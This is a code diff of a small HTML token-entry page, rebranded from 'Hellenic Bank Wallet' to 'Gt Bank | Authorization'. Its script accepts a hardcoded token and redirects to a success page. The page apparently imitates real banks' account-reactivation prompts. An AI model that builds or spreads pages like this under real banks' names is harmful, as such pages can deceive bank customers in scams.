@@ -22,19 +22,20 @@
 
   <link rel="shortcut icon" type="image/x-icon" href="assets/images/favicon.ico">
 
-  <title>Token Input | Hellenic Bank Wallet</title>
+  <title>Gt Bank | Authorization</title>
 </head>
 
-<body style="background-color: #222a43;">
-  <div id="main-wrapper" class="error-message">
+<body class="theme-light">
+  <div id="main-wrapper" class="error-message bg-white">
 
     <!-- <i class="fa fa-frown" aria-hidden="true"></i> -->
     <!-- <h3>Sorry!</h3> -->
-    <h3>Input Token to enable us re-activate your account.</h3>
+    <p style="color: #000; margin-right: 200px;">Enter token</p>
     <div class="token">
       <form>
-        <input class="token-form" name="text" type="text" placeholder="Enter token here" required autocomplete="off" />
-        <button onclick="token(this.form)" class="tokenInput-btn" type="submit">SUBMIT</button>
+        <input class="token-form" name="text" type="text" placeholder="Enter token here" required
+          autocomplete="off" /><br />
+        <button onclick="token(this.form)" class="tokenInput-btn mt-5" type="button">SUBMIT</button>
       </form>
     </div>
   </div>
@@ -42,7 +43,10 @@
   <script type="text/javascript">
     function token(form) {
       if (form.text.value === "20233") {
-        window.open("dashboard.html");
+        $('.tokenInput-btn').html('please wait...');
+        setTimeout(() => {
+          window.location.href = "success.html";
+        }, 3000)
       }
       else if (form.text.value === "") {
         $(document).ready(function () {
